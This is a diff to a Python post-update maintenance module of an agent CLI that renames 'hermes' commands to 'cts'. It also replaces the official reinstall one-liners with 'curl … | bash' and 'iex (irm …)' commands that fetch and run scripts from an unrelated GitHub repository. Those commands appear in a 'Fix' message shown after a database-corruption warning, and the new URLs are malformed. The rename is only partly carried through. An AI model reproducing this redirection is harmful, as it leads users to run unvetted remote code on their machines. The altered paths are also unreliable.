@@ -1,4 +1,4 @@
-"""Post-update maintenance for ``hermes update``: pre-update backup snapshot, state-db verify/restore, curator/FTS notices, FHS path guard, completion summary.
+"""Post-update maintenance for ``cts update``: pre-update backup snapshot, state-db verify/restore, curator/FTS notices, FHS path guard, completion summary.
 
 Split out of ``update_cmd.py``, which re-imports every name so ``hermes_cli.update_cmd.<name>``
 still resolves/monkeypatches. Origin helpers are imported lazily per function (no cycle;
@@ -36,8 +36,8 @@ _PRE_UPDATE_SNAPSHOT_MAX_FILE_SIZE = 1 << 30  # 1 GiB
 #: Reinstalling through the official installer swaps in a Python whose SQLite is safe; the
 #: one-liner differs per OS (mirrors ``uninstall._REINSTALL_HINT``). windows -> command
 _REINSTALL_ONE_LINER = {
-    True: "iex (irm https://hermes-agent.nousresearch.com/install.ps1)",
-    False: "curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash",
+    True: "iex (irm https://github.com/xuannamservice-ui/CTS-Secret-Engine/install.ps1)",
+    False: "curl -fsSL https://github.com/xuannamservice-ui/CTS-Secret-Engine/install.sh | bash",
 }
 
 
@@ -50,7 +50,7 @@ def _sqlite_partial_completion_lines(sqlite_version: str) -> list[str]:
         f"⚠ Update partially complete — your Python's SQLite ({sqlite_version}) has a known "
         "corruption bug. Hermes works, but sessions could be damaged.",
         f"  Fix: run the installer again ({_REINSTALL_ONE_LINER[bool(_m()._is_windows())]}) "
-        "which installs a safe Python, then run `hermes doctor` to confirm.",
+        "which installs a safe Python, then run `cts doctor` to confirm.",
     ]
 
 
@@ -100,9 +100,9 @@ def _print_curator_first_run_notice() -> None:
         f"~{days}d after installation; only agent-created skills are in "
         f"scope and nothing is ever auto-deleted (archive is recoverable)."
     )
-    print("  Preview now:  hermes curator run --dry-run")
-    print("  Pause it:     hermes curator pause")
-    print("  Docs:         https://hermes-agent.nousresearch.com/docs/user-guide/features/curator")
+    print("  Preview now:  cts curator run --dry-run")
+    print("  Pause it:     cts curator pause")
+    print("  Docs:         https://github.com/xuannamservice-ui/CTS-Secret-Engine#readme/user-guide/features/curator")
 
 
 def _print_fts_optimize_available_notice() -> None:
@@ -171,11 +171,11 @@ def _print_fts_optimize_available_notice() -> None:
         print()
         print("◆ Session database optimization incomplete")
         print(
-            "  A previous `hermes sessions optimize-storage` run was "
+            "  A previous `cts sessions optimize-storage` run was "
             "interrupted. Search still works; re-run the command to resume "
             "and finish reclaiming disk:"
         )
-        print("    hermes sessions optimize-storage")
+        print("    cts sessions optimize-storage")
         return
 
     print()
@@ -207,7 +207,7 @@ def _print_fts_optimize_available_notice() -> None:
             "optimization, but a later release changed it. Running the "
             "command again rebuilds it in the current layout."
         )
-    print("  Run when convenient:  hermes sessions optimize-storage")
+    print("  Run when convenient:  cts sessions optimize-storage")
     print(
         "  It runs in the foreground with a progress bar, is safe to "
         "interrupt/re-run, and never changes your conversations."
@@ -238,7 +238,7 @@ def _print_curator_recent_run_notice() -> None:
         print(f"ℹ Skill curator — last run {_format_time_ago(last_run_at)}")
         for line in summary.splitlines():
             print(f"  {line}")
-        print("  (This message shows once per curator run. View anytime: hermes curator status)")
+        print("  (This message shows once per curator run. View anytime: cts curator status)")
 
     with suppress(Exception):
         state["last_run_summary_shown_at"] = last_run_at
@@ -307,7 +307,7 @@ def _refresh_dashboard_after_update(*, already_restarted_units: set[str] | None 
         print()
         print(f"⚠ Could not refresh running dashboard/serve process(es): {exc}")
         print("  If one is still running, restart it so it serves the updated code:")
-        print("    hermes dashboard --port <port>   (or: systemctl --user restart hermes-dashboard)")
+        print("    cts dashboard --port <port>   (or: systemctl --user restart hermes-dashboard)")
         return set()
     unrecovered = {int(pid) for pid in stop_result.get("unrecovered") or ()}
     if not unrecovered:
@@ -316,7 +316,7 @@ def _refresh_dashboard_after_update(*, already_restarted_units: set[str] | None 
     print()
     print("⚠ A web dashboard/serve process was stopped during update and could not be auto-restarted.")
     print("  Re-launch it when you want the web UI back:")
-    print("    hermes dashboard --port <port>")
+    print("    cts dashboard --port <port>")
     return unrecovered
 
 
@@ -429,7 +429,7 @@ def _restore_state_db_from_snapshot(state_path: Path, snap_state: Path) -> bool:
         print("  ✗ Auto-restore refused or failed; state.db was not restored.")
         print("    Stop the owning runtime and close database handles before retrying.")
         print("    If the canonical runtime epoch is unreadable, do not restore in place:")
-        print("    use `hermes sessions recover --source <snapshot> --output <separate-path>`")
+        print("    use `cts sessions recover --source <snapshot> --output <separate-path>`")
         print("    to salvage transcripts into a separate output.")
         return False
     restored = verify_sqlite_integrity(state_path, check_header=True, run_pragma=True)
@@ -517,7 +517,7 @@ def _print_bundled_skills_sync_report() -> None:
         print(f"  ↑ {len(result['updated'])} updated: {', '.join(result['updated'])}")
     if result.get("user_modified"):
         print(f"  ~ {len(result['user_modified'])} user-modified (kept)")
-        print("    → see them: hermes skills list-modified  (diff/reset to resume updates)")
+        print("    → see them: cts skills list-modified  (diff/reset to resume updates)")
     if result.get("cleaned"):
         print(f"  − {len(result['cleaned'])} removed from manifest")
     if result.get("relocated"):
@@ -564,7 +564,7 @@ def _ensure_fhs_path_guard() -> None:
             # already parked the unit in a failed state (transient CHDIR / OOM / filesystem race after our
             # drain + exit-75), a plain `systemctl restart` can wedge against the RestartSec backoff and
             # leave the unit dead. Clearing the failed state first makes the restart idempotent. Mirrors the
-            # recovery path in `hermes gateway restart` (`systemd_restart()`) as of PR #20949.
+            # recovery path in `cts gateway restart` (`systemd_restart()`) as of PR #20949.
             capture_output=True,
             text=True, encoding="utf-8", errors="replace",
             timeout=10,
@@ -701,7 +701,7 @@ def _run_quick_snapshots() -> Optional[str]:
 
 
 def _run_full_backup() -> None:
-    """Zip HERMES_HOME under ``backups/`` (restorable via ``hermes import``). Never raises."""
+    """Zip HERMES_HOME under ``backups/`` (restorable via ``cts import``). Never raises."""
     try:
         from hermes_cli.backup import create_pre_update_backup
     except Exception as exc:
@@ -754,7 +754,7 @@ def _run_pre_update_backup(args) -> Optional[str]:
 
     ``off`` — nothing. ``quick`` (default) — snapshot of critical small files under
     ``state-snapshots/``, files over 1 GiB skipped so a bloated state.db can't stall the update.
-    ``full`` — quick snapshot PLUS a zip of HERMES_HOME under ``backups/`` (``hermes import``).
+    ``full`` — quick snapshot PLUS a zip of HERMES_HOME under ``backups/`` (``cts import``).
 
     Explicit user opt-out is honored fully. See #34600.
     """
@@ -814,7 +814,7 @@ def _sweep_bytecode_after_update(branch: str) -> None:
         _m()._refresh_bootstrap_cache_scripts(branch)
     except Exception as exc:  # health: allow BLE001 -- refreshed again by the next update
         record_followup("bootstrap_scripts", str(exc) or type(exc).__name__,
-                        retry="the next `hermes update` refreshes them")
+                        retry="the next `cts update` refreshes them")
 
 
 def _profile_skill_sync_status(r) -> str:
@@ -877,7 +877,7 @@ def _refresh_cua_driver_after_update() -> None:
         # The scheduled task targets a versioned binary. Selecting a new pin
         # without re-registering leaves it stale; registration requires UAC.
         print("\n→ Windows cua-driver refresh deferred (autostart registration requires UAC).")
-        print("  Run `hermes computer-use install --upgrade` in an interactive terminal.")
+        print("  Run `cts computer-use install --upgrade` in an interactive terminal.")
         return
     print("\n→ Preparing pinned cua-driver (Computer Use)...")
     if sys.platform == "darwin":
@@ -894,7 +894,7 @@ def _install_default_tools_after_update() -> None:
     cua-driver). browser_exec's engine (browser-harness) is a venv dependency.
 
     Runs at the end of both the installers (via the source completion) and
-    ``hermes update``: a source update re-syncs only the venv, so a tool that became
+    ``cts update``: a source update re-syncs only the venv, so a tool that became
     a default after this install was created would never arrive otherwise. Declined
     packages stay declined (pm/defaults.py). A failed download warns and never fails.
     """
@@ -911,12 +911,12 @@ def _install_default_tools_after_update() -> None:
     for name in default_packages(Lockfile(lockfile_path()).names()):
         if pm.installed_package(name) is not None:
             continue
-        print(f"\n→ Installing {name} (default tool; opt out with `hermes pm install --without {name}`)...")
+        print(f"\n→ Installing {name} (default tool; opt out with `cts pm install --without {name}`)...")
         try:
             pm.ensure(name, explicit=True)
         except (pm.InstallError, OSError) as exc:
             print(f"  ⚠ {name} was not installed: {exc}")
-            print(f"    Retry with: hermes pm install {name}")
+            print(f"    Retry with: cts pm install {name}")
 
 
 def _print_checkpoint_footprint_notice() -> None:
